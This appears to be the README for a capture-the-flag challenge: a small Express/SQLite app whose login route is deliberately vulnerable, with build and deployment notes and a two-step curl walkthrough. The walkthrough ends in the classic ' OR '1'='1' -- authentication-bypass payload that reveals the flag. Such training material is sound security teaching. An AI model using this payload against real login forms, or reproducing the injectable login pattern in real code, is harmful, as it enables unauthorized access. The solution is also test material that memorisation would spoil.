# drowned_admin — build / local QA

This Island is a tiny Express + SQLite app whose `/login` route is
intentionally vulnerable to classical authentication-bypass SQLi. The flag is
**injected at runtime** via the `CHALLENGE_FLAG` environment variable; the
image never bakes the flag in.

## Run locally

```bash
./build/build.sh
```

That wrapper reads `flag.txt`, validates the regex, exports `CHALLENGE_FLAG`,
and runs `docker compose up --build` from `build/`. Visit
<http://localhost:8080/> and the harbourmaster login page should appear.

## Cold-solve

The intended path (see `solution.md`):

1. `curl -s -X POST -d "username='&password=x" http://localhost:8080/login`
   — the response includes a verbose `SQLITE_ERROR` block, signalling the engine.
2. `curl -s -X POST --data-urlencode "username=' OR '1'='1' --" --data "password=x" http://localhost:8080/login`
   — the response is the dashboard HTML containing
   `Welcome back, Eli. Your treasure is safe: progctf{...}`.

## Production

Shipwright's sandbox-controller pod will pull the image, attach the
`island-flags` Secret, and resolve `CHALLENGE_FLAG` from the
`cursed_ports_port_drowned_admin` key per `island.yaml`.
